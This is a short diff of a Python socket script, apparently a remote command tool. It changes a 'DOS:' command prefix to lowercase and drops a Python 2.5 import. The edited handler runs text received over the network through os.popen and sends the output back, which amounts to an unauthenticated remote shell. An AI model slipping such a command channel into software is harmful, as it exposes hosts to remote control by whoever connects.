@@ -1,4 +1,3 @@
-from __future__ import with_statement #for python 2.5
 import platform
 import socket
 import psutil
@@ -64,7 +63,7 @@ while message != "kill":
                     conn.send(ps_data.encode())
 
                 try:
-                    if message == (f'DOS:{msg_split1}'):
+                    if message == (f'dos:{msg_split1}'):
                         ps_data1 = os.popen(msg_split1).read()
                         # print(ps_data)
                         conn.send(ps_data1.encode())
